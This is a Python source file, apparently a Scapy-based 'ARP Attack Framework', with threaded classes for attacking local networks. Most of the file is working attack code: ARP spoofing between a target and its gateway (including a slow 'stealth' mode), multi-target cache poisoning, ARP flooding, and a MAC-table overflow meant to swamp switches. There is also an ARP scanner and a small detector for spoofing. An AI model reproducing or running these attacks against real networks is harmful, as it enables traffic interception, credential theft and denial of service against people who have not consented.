#!/usr/bin/env python3
"""
ARP Attack Framework - Professional Grade
Fully Fixed Version
"""

import threading
import time
import logging
import platform
import os
import sys
import socket
import netifaces
from datetime import datetime
from typing import Optional, List, Dict, Tuple, Callable, Set
from dataclasses import dataclass
from enum import Enum
import ipaddress

from scapy.all import (
    ARP, Ether, sendp, sniff, conf, get_if_hwaddr,
    IP, ICMP, TCP, UDP, DNS, DNSQR, RandMAC, arping,
    Dot1Q, Packet, srp, getmacbyip
)
from scapy.sendrecv import AsyncSniffer
from scapy.arch import get_if_addr

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('arp_attacks.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger('ARP_Attacks')

conf.promisc = True
conf.verb = 0  # Suppress Scapy output


class AttackType(Enum):
    """Types of ARP attacks"""
    SPOOFING = "arp_spoofing"
    CACHE_POISONING = "cache_poisoning"
    FLOODING = "flooding"
    GRATUITOUS = "gratuitous_arp"
    DOS = "denial_of_service"
    SCANNING = "scanning"
    TABLE_OVERFLOW = "table_overflow"
    RARP_ATTACK = "rarp_attack"
    PROXY_ARP = "proxy_arp"
    INSPECTION = "inspection"


@dataclass
class AttackResult:
    """Result of an attack execution"""
    success: bool
    packets_sent: int
    duration: float
    targets_affected: List[str]
    error: Optional[str] = None


class NetworkDiscovery:
    """Network discovery and information gathering"""

    @staticmethod
    def get_network_info(iface: str) -> Dict[str, any]:
        """Get comprehensive network information"""
        try:
            # Get interface IP and netmask
            addrs = netifaces.ifaddresses(iface)
            ipv4_info = addrs.get(netifaces.AF_INET, [{}])[0]
            ip_addr = ipv4_info.get('addr', 'Unknown')
            netmask = ipv4_info.get('netmask', '255.255.255.0')

            # Calculate network CIDR
            network = ipaddress.IPv4Network(f"{ip_addr}/{netmask}", strict=False)

            # Get gateway
            gateway = None
            gateways = netifaces.gateways()
            default_gateway = gateways.get('default', {})
            if netifaces.AF_INET in default_gateway:
                gateway_info = default_gateway[netifaces.AF_INET]
                if gateway_info[1] == iface:
                    gateway = gateway_info[0]

            return {
                'interface': iface,
                'ip_address': ip_addr,
                'netmask': netmask,
                'network_cidr': str(network),
                'gateway': gateway,
                'total_hosts': network.num_addresses - 2,  # Exclude network and broadcast
                'mac_address': get_if_hwaddr(iface)
            }
        except Exception as e:
            logger.error(f"Error getting network info: {e}")
            return {}

    @staticmethod
    def get_local_network() -> str:
        """Get local network CIDR"""
        try:
            # Get default interface
            gateways = netifaces.gateways()
            default_interface = gateways['default'][netifaces.AF_INET][1]

            # Get network info for default interface
            network_info = NetworkDiscovery.get_network_info(default_interface)
            return network_info.get('network_cidr', '192.168.1.0/24')
        except:
            return '192.168.1.0/24'


class AdvancedARPSpoofing:
    """Advanced ARP Spoofing with multiple techniques - FIXED THREADING"""

    def __init__(self, iface: str, verbose: bool = False):
        self.iface = iface
        self.verbose = verbose
        self.running = False
        self.poison_thread = None
        self.victims: Dict[str, str] = {}
        self.stats = {
            'packets_sent': 0,
            'start_time': None,
            'targets_poisoned': set()
        }

    def start_advanced_spoofing(self,
                                target_ip: str,
                                gateway_ip: str,
                                technique: str = "bidirectional",
                                duration: Optional[int] = None) -> AttackResult:
        """Start advanced ARP spoofing with various techniques"""

        if self.running:
            logger.warning("ARP spoofing already running")
            return AttackResult(False, 0, 0, [], "Already running")

        self.running = True
        self.stats = {'packets_sent': 0, 'start_time': time.time(), 'targets_poisoned': set()}
        self.victims = {'target': target_ip, 'gateway': gateway_ip}

        logger.info(f"Starting {technique} ARP spoofing: {target_ip} <-> {gateway_ip}")

        # Start poisoning thread
        self.poison_thread = threading.Thread(
            target=self._poison_technique_wrapper,
            args=(technique, target_ip, gateway_ip, duration)
        )
        self.poison_thread.daemon = True
        self.poison_thread.start()

        return AttackResult(True, 0, 0, [target_ip, gateway_ip])

    def _poison_technique_wrapper(self, technique: str, target_ip: str,
                                  gateway_ip: str, duration: Optional[int]):
        """Wrapper for poison techniques with duration control"""
        start_time = time.time()

        while self.running:
            if duration and (time.time() - start_time) > duration:
                break

            if technique == "bidirectional":
                self._bidirectional_poison(target_ip, gateway_ip)
            elif technique == "unidirectional":
                self._unidirectional_poison(target_ip, gateway_ip)
            elif technique == "aggressive":
                self._aggressive_poison(target_ip, gateway_ip)
            elif technique == "passive":
                self._passive_poison(target_ip, gateway_ip)

        # Don't call stop_spoofing from within the thread - let the main thread handle it
        self.running = False

    def _bidirectional_poison(self, target_ip: str, gateway_ip: str):
        """Standard bidirectional ARP poisoning"""
        try:
            # Get real MAC addresses for proper Ethernet framing
            try:
                target_mac = getmacbyip(target_ip)
            except:
                target_mac = "ff:ff:ff:ff:ff:ff"

            try:
                gateway_mac = getmacbyip(gateway_ip)
            except:
                gateway_mac = "ff:ff:ff:ff:ff:ff"

            # Poison target - tell target that gateway is at our MAC
            arp_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
            sendp(Ether(dst=target_mac) / arp_target, iface=self.iface, verbose=False)

            # Poison gateway - tell gateway that target is at our MAC
            arp_gateway = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac)
            sendp(Ether(dst=gateway_mac) / arp_gateway, iface=self.iface, verbose=False)

            self.stats['packets_sent'] += 2
            self.stats['targets_poisoned'].update([target_ip, gateway_ip])

            if self.verbose and self.stats['packets_sent'] % 10 == 0:
                logger.info(f"Bidirectional poison packets: {self.stats['packets_sent']}")

            time.sleep(2)

        except Exception as e:
            logger.error(f"Bidirectional poison error: {e}")

    def _unidirectional_poison(self, target_ip: str, gateway_ip: str):
        """Only poison one direction"""
        try:
            try:
                target_mac = getmacbyip(target_ip)
            except:
                target_mac = "ff:ff:ff:ff:ff:ff"

            arp_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
            sendp(Ether(dst=target_mac) / arp_target, iface=self.iface, verbose=False)

            self.stats['packets_sent'] += 1
            self.stats['targets_poisoned'].add(target_ip)

            time.sleep(3)

        except Exception as e:
            logger.error(f"Unidirectional poison error: {e}")

    def _aggressive_poison(self, target_ip: str, gateway_ip: str):
        """Aggressive poisoning with higher frequency"""
        try:
            # Get MAC addresses
            try:
                target_mac = getmacbyip(target_ip)
                gateway_mac = getmacbyip(gateway_ip)
            except:
                target_mac = gateway_mac = "ff:ff:ff:ff:ff:ff"

            for _ in range(3):  # Send multiple packets
                arp_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
                arp_gateway = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac)

                sendp(Ether(dst=target_mac) / arp_target, iface=self.iface, verbose=False)
                sendp(Ether(dst=gateway_mac) / arp_gateway, iface=self.iface, verbose=False)

                self.stats['packets_sent'] += 2

            self.stats['targets_poisoned'].update([target_ip, gateway_ip])

            if self.verbose:
                logger.info(f"Aggressive poison round: {self.stats['packets_sent']} packets")

            time.sleep(1)

        except Exception as e:
            logger.error(f"Aggressive poison error: {e}")

    def _passive_poison(self, target_ip: str, gateway_ip: str):
        """Passive poisoning - slower rate for stealth"""
        try:
            try:
                target_mac = getmacbyip(target_ip)
            except:
                target_mac = "ff:ff:ff:ff:ff:ff"

            arp_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
            sendp(Ether(dst=target_mac) / arp_target, iface=self.iface, verbose=False)

            self.stats['packets_sent'] += 1
            self.stats['targets_poisoned'].add(target_ip)

            time.sleep(10)  # Very slow for stealth

        except Exception as e:
            logger.error(f"Passive poison error: {e}")

    def stop_spoofing(self):
        """Stop ARP spoofing and restore ARP tables"""
        if self.running:
            self.running = False

            # Wait for thread to finish naturally
            if self.poison_thread and self.poison_thread.is_alive():
                self.poison_thread.join(timeout=5)

            # Restore ARP tables
            self._restore_arp_tables()

            if self.stats['start_time']:
                duration = time.time() - self.stats['start_time']
                logger.info(f"ARP spoofing stopped. Packets: {self.stats['packets_sent']}, "
                            f"Duration: {duration:.2f}s")

    def _restore_arp_tables(self):
        """Restore ARP tables of poisoned victims"""
        try:
            target_ip = self.victims.get('target')
            gateway_ip = self.victims.get('gateway')

            if target_ip and gateway_ip:
                # Get real MAC addresses
                try:
                    target_mac = getmacbyip(target_ip)
                    gateway_mac = getmacbyip(gateway_ip)
                except:
                    logger.warning("Could not resolve MAC addresses for restoration")
                    return

                # Send restoration packets
                for _ in range(3):
                    # Restore target's ARP cache - tell target real gateway MAC
                    arp_restore_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip,
                                             hwdst=target_mac, hwsrc=gateway_mac)
                    sendp(Ether(dst=target_mac) / arp_restore_target, iface=self.iface, verbose=False)

                    # Restore gateway's ARP cache - tell gateway real target MAC
                    arp_restore_gateway = ARP(op=2, pdst=gateway_ip, psrc=target_ip,
                                              hwdst=gateway_mac, hwsrc=target_mac)
                    sendp(Ether(dst=gateway_mac) / arp_restore_gateway, iface=self.iface, verbose=False)

                    time.sleep(1)

                logger.info("ARP tables restored")

        except Exception as e:
            logger.error(f"Error restoring ARP tables: {e}")


class ARPCachePoisoning:
    """Advanced ARP Cache Poisoning for multiple targets"""

    def __init__(self, iface: str, verbose: bool = False):
        self.iface = iface
        self.verbose = verbose
        self.running = False
        self.poison_thread = None
        self.targets: List[str] = []
        self.spoofed_ips: List[str] = []
        self.stats = {'packets_sent': 0}

    def add_targets(self, targets: List[str]):
        """Add multiple targets for cache poisoning"""
        self.targets.extend([t for t in targets if t not in self.targets])
        logger.info(f"Added {len(targets)} targets for cache poisoning")

    def start_cache_poisoning(self, spoofed_ips: List[str],
                              technique: str = "standard",
                              duration: Optional[int] = None) -> AttackResult:
        """Start advanced cache poisoning"""

        if self.running:
            return AttackResult(False, 0, 0, [], "Already running")

        if not self.targets:
            return AttackResult(False, 0, 0, [], "No targets specified")

        self.running = True
        self.spoofed_ips = spoofed_ips
        self.stats = {'packets_sent': 0}

        logger.info(f"Starting cache poisoning for {len(self.targets)} targets "
                    f"with {len(spoofed_ips)} spoofed IPs")

        self.poison_thread = threading.Thread(
            target=self._cache_poison_loop,
            args=(technique, duration)
        )
        self.poison_thread.daemon = True
        self.poison_thread.start()

        return AttackResult(True, 0, 0, self.targets)

    def _cache_poison_loop(self, technique: str, duration: Optional[int]):
        """Main cache poisoning loop"""
        start_time = time.time()

        while self.running:
            if duration and (time.time() - start_time) > duration:
                break

            try:
                for target_ip in self.targets:
                    for spoofed_ip in self.spoofed_ips:
                        if technique == "standard":
                            self._standard_poison(target_ip, spoofed_ip)
                        elif technique == "random_mac":
                            self._random_mac_poison(target_ip, spoofed_ip)
                        elif technique == "flood":
                            self._flood_poison(target_ip, spoofed_ip)

                time.sleep(3)

            except Exception as e:
                logger.error(f"Cache poison loop error: {e}")
                break

        self.running = False

    def _standard_poison(self, target_ip: str, spoofed_ip: str):
        """Standard cache poisoning"""
        try:
            target_mac = getmacbyip(target_ip)
        except:
            target_mac = "ff:ff:ff:ff:ff:ff"

        arp_reply = ARP(op=2, pdst=target_ip, psrc=spoofed_ip, hwdst=target_mac)
        sendp(Ether(dst=target_mac) / arp_reply, iface=self.iface, verbose=False)
        self.stats['packets_sent'] += 1

    def _random_mac_poison(self, target_ip: str, spoofed_ip: str):
        """Poison with random MAC addresses"""
        try:
            target_mac = getmacbyip(target_ip)
        except:
            target_mac = "ff:ff:ff:ff:ff:ff"

        arp_reply = ARP(op=2, pdst=target_ip, psrc=spoofed_ip, hwdst=target_mac, hwsrc=RandMAC())
        sendp(Ether(dst=target_mac) / arp_reply, iface=self.iface, verbose=False)
        self.stats['packets_sent'] += 1

    def _flood_poison(self, target_ip: str, spoofed_ip: str):
        """Flood poisoning - multiple packets quickly"""
        try:
            target_mac = getmacbyip(target_ip)
        except:
            target_mac = "ff:ff:ff:ff:ff:ff"

        for _ in range(5):
            arp_reply = ARP(op=2, pdst=target_ip, psrc=spoofed_ip, hwdst=target_mac, hwsrc=RandMAC())
            sendp(Ether(dst=target_mac) / arp_reply, iface=self.iface, verbose=False)
            self.stats['packets_sent'] += 1

    def stop_cache_poisoning(self):
        """Stop cache poisoning"""
        if self.running:
            self.running = False
            if self.poison_thread and self.poison_thread.is_alive():
                self.poison_thread.join(timeout=3)
            logger.info(f"Cache poisoning stopped. Packets sent: {self.stats['packets_sent']}")


class ARPFlooding:
    """Advanced ARP Flooding Attacks"""

    def __init__(self, iface: str, verbose: bool = False):
        self.iface = iface
        self.verbose = verbose
        self.running = False
        self.flood_thread = None
        self.stats = {'packets_sent': 0}

    def start_arp_flood(self,
                        target_ip: Optional[str] = None,
                        flood_type: str = "requests",
                        packet_rate: int = 100,
                        duration: Optional[int] = None) -> AttackResult:
        """Start advanced ARP flooding"""

        if self.running:
            return AttackResult(False, 0, 0, [], "Already running")

        self.running = True
        self.stats = {'packets_sent': 0}

        logger.info(f"Starting {flood_type} ARP flood at {packet_rate} pps")

        self.flood_thread = threading.Thread(
            target=self._flood_loop,
            args=(flood_type, target_ip, packet_rate, duration)
        )
        self.flood_thread.daemon = True
        self.flood_thread.start()

        target_list = [target_ip] if target_ip else ["broadcast"]
        return AttackResult(True, 0, 0, target_list)

    def _flood_loop(self, flood_type: str, target_ip: Optional[str],
                    packet_rate: int, duration: Optional[int]):
        """Main flooding loop"""
        start_time = time.time()
        inter_val = 1.0 / packet_rate

        while self.running:
            if duration and (time.time() - start_time) > duration:
                break

            try:
                if flood_type == "requests":
                    self._flood_requests(target_ip)
                elif flood_type == "replies":
                    self._flood_replies(target_ip)
                elif flood_type == "gratuitous":
                    self._flood_gratuitous(target_ip)
                elif flood_type == "mixed":
                    self._flood_mixed(target_ip)

                time.sleep(inter_val)

            except Exception as e:
                logger.error(f"Flood loop error: {e}")
                break

        self.running = False

    def _flood_requests(self, target_ip: Optional[str]):
        """Flood with ARP requests"""
        if target_ip:
            # Targeted ARP request
            arp_packet = ARP(pdst=target_ip)
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet, iface=self.iface, verbose=False)
        else:
            # Broadcast ARP request
            arp_packet = ARP(pdst="255.255.255.255")
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet, iface=self.iface, verbose=False)

        self.stats['packets_sent'] += 1

    def _flood_replies(self, target_ip: Optional[str]):
        """Flood with ARP replies"""
        if target_ip:
            try:
                target_mac = getmacbyip(target_ip)
            except:
                target_mac = "ff:ff:ff:ff:ff:ff"

            arp_packet = ARP(op=2, pdst=target_ip, psrc="192.168.1.254", hwdst=target_mac)
            sendp(Ether(dst=target_mac) / arp_packet, iface=self.iface, verbose=False)
        else:
            arp_packet = ARP(op=2, pdst="255.255.255.255", psrc="192.168.1.254")
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet, iface=self.iface, verbose=False)

        self.stats['packets_sent'] += 1

    def _flood_gratuitous(self, target_ip: Optional[str]):
        """Flood with gratuitous ARP"""
        spoofed_ip = target_ip or "192.168.1.100"
        garp = ARP(op=2, psrc=spoofed_ip, pdst=spoofed_ip)
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / garp, iface=self.iface, verbose=False)
        self.stats['packets_sent'] += 1

    def _flood_mixed(self, target_ip: Optional[str]):
        """Mixed flooding with various packet types"""
        try:
            target_mac = getmacbyip(target_ip) if target_ip else "ff:ff:ff:ff:ff:ff"
        except:
            target_mac = "ff:ff:ff:ff:ff:ff"

        packets = [
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip or "255.255.255.255"),
            Ether(dst=target_mac) / ARP(op=2, pdst=target_ip or "255.255.255.255", psrc="192.168.1.254"),
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=target_ip or "192.168.1.100",
                                                 pdst=target_ip or "192.168.1.100")
        ]

        for pkt in packets:
            sendp(pkt, iface=self.iface, verbose=False)
            self.stats['packets_sent'] += 1

    def stop_arp_flood(self):
        """Stop ARP flooding"""
        if self.running:
            self.running = False
            if self.flood_thread and self.flood_thread.is_alive():
                self.flood_thread.join(timeout=3)
            logger.info(f"ARP flood stopped. Packets sent: {self.stats['packets_sent']}")


class ARPTableOverflow:
    """ARP Table Overflow Attack"""

    def __init__(self, iface: str, verbose: bool = False):
        self.iface = iface
        self.verbose = verbose
        self.running = False
        self.overflow_thread = None
        self.stats = {'unique_macs_sent': 0, 'packets_sent': 0}
        self._mac_counter = 0

    def start_table_overflow(self, target_ip: Optional[str] = None,
                             mac_generation: str = "random",
                             duration: Optional[int] = None) -> AttackResult:
        """Start ARP table overflow attack"""

        if self.running:
            return AttackResult(False, 0, 0, [], "Already running")

        self.running = True
        self.stats = {'unique_macs_sent': 0, 'packets_sent': 0}

        logger.info(f"Starting ARP table overflow attack (MAC generation: {mac_generation})")

        self.overflow_thread = threading.Thread(
            target=self._overflow_loop,
            args=(target_ip, mac_generation, duration)
        )
        self.overflow_thread.daemon = True
        self.overflow_thread.start()

        target_list = [target_ip] if target_ip else ["network_switches"]
        return AttackResult(True, 0, 0, target_list)

    def _overflow_loop(self, target_ip: Optional[str], mac_generation: str,
                       duration: Optional[int]):
        """Main overflow loop"""
        start_time = time.time()
        unique_macs: Set[str] = set()

        while self.running:
            if duration and (time.time() - start_time) > duration:
                break

            try:
                # Generate unique MACs to overflow switch tables
                for _ in range(10):
                    if mac_generation == "random":
                        src_mac = str(RandMAC())  # Convert to string to make hashable
                    else:
                        src_mac = self._incremental_mac()

                    unique_macs.add(src_mac)

                    # Send ARP packet with unique MAC
                    arp_pkt = ARP(op=1, pdst=target_ip or "255.255.255.255",
                                  hwsrc=src_mac)
                    sendp(Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") / arp_pkt,
                          iface=self.iface, verbose=False)

                    self.stats['packets_sent'] += 1

                self.stats['unique_macs_sent'] = len(unique_macs)

                if self.verbose and len(unique_macs) % 100 == 0:
                    logger.info(f"Unique MACs sent: {len(unique_macs)}")

                time.sleep(0.1)

            except Exception as e:
                logger.error(f"Overflow loop error: {e}")
                break

        self.running = False

    def _incremental_mac(self) -> str:
        """Generate incremental MAC addresses"""
        base_mac = "00:11:22:33:44:"
        counter = self._mac_counter
        self._mac_counter += 1
        return f"{base_mac}{counter:02x}"

    def stop_table_overflow(self):
        """Stop table overflow attack"""
        if self.running:
            self.running = False
            if self.overflow_thread and self.overflow_thread.is_alive():
                self.overflow_thread.join(timeout=3)
            logger.info(f"Table overflow stopped. Unique MACs: {self.stats['unique_macs_sent']}, "
                        f"Packets: {self.stats['packets_sent']}")


class ARPInspection:
    """ARP Traffic Inspection and Analysis - IMPROVED SCANNING"""

    def __init__(self, iface: str, verbose: bool = False):
        self.iface = iface
        self.verbose = verbose
        self.sniffer = None
        self.discovered_hosts: Dict[str, str] = {}
        self.arp_traffic: List[Dict] = []
        self.suspicious_activity: List[Dict] = []

    def arp_scan_network(self, network: str = "192.168.1.0/24", timeout: int = 30) -> Dict[str, str]:
        """Active ARP network scanning - IMPROVED with longer timeout"""
        logger.info(f"Starting active ARP scan: {network} (timeout: {timeout}s)")

        try:
            # Use Scapy's arping for active scanning with longer timeout
            ans, unans = arping(network, iface=self.iface, timeout=timeout, verbose=False)

            for sent, received in ans:
                ip = received.psrc
                mac = received.hwsrc
                self.discovered_hosts[ip] = mac
                logger.info(f"Active scan found: {ip} -> {mac}")

            logger.info(f"Active scan completed: {len(self.discovered_hosts)} hosts found")
            return self.discovered_hosts

        except Exception as e:
            logger.error(f"Active ARP scan error: {e}")
            return {}

    def start_arp_inspection(self, duration: int = 60) -> Dict[str, any]:
        """Start ARP traffic inspection"""
        logger.info(f"Starting ARP inspection for {duration} seconds")

        self.discovered_hosts.clear()
        self.arp_traffic.clear()
        self.suspicious_activity.clear()

        self.sniffer = AsyncSniffer(iface=self.iface, filter="arp",
                                    prn=self._analyze_arp_packet)
        self.sniffer.start()

        # Wait for specified duration
        time.sleep(duration)

        self.stop_inspection()

        return {
            'hosts_discovered': len(self.discovered_hosts),
            'arp_packets_analyzed': len(self.arp_traffic),
            'suspicious_activities': len(self.suspicious_activity),
            'hosts': self.discovered_hosts,
            'suspicious': self.suspicious_activity
        }

    def _analyze_arp_packet(self, pkt):
        """Analyze ARP packets for suspicious activity"""
        if ARP in pkt:
            arp = pkt[ARP]
            packet_info = {
                'timestamp': datetime.now().isoformat(),
                'operation': 'request' if arp.op == 1 else 'reply',
                'sender_ip': arp.psrc,
                'sender_mac': arp.hwsrc,
                'target_ip': arp.pdst,
                'target_mac': arp.hwdst
            }

            self.arp_traffic.append(packet_info)

            # Update discovered hosts
            if arp.psrc not in self.discovered_hosts:
                self.discovered_hosts[arp.psrc] = arp.hwsrc
                if self.verbose:
                    logger.info(f"New host discovered: {arp.psrc} -> {arp.hwsrc}")

            # Detect suspicious activity
            self._detect_suspicious_activity(packet_info)

    def _detect_suspicious_activity(self, packet_info: Dict):
        """Detect potentially malicious ARP activity"""
        suspicious = False
        reasons = []

        # Detect ARP spoofing attempts
        if packet_info['operation'] == 'reply':
            known_mac = self.discovered_hosts.get(packet_info['sender_ip'])
            if known_mac and known_mac != packet_info['sender_mac']:
                suspicious = True
                reasons.append(f"MAC address change: {known_mac} -> {packet_info['sender_mac']}")

        # Detect unusual ARP traffic patterns
        if packet_info['sender_ip'] == packet_info['target_ip']:
            suspicious = True
            reasons.append("Gratuitous ARP detected")

        if suspicious:
            detection = {
                'timestamp': packet_info['timestamp'],
                'suspicious_packet': packet_info,
                'reasons': reasons
            }
            self.suspicious_activity.append(detection)
            logger.warning(f"Suspicious ARP activity: {reasons}")

    def stop_inspection(self):
        """Stop ARP inspection"""
        if self.sniffer:
            self.sniffer.stop()
        logger.info("ARP inspection stopped")


# =============================================================================
# PROFESSIONAL DEMONSTRATION - FULLY FIXED
# =============================================================================

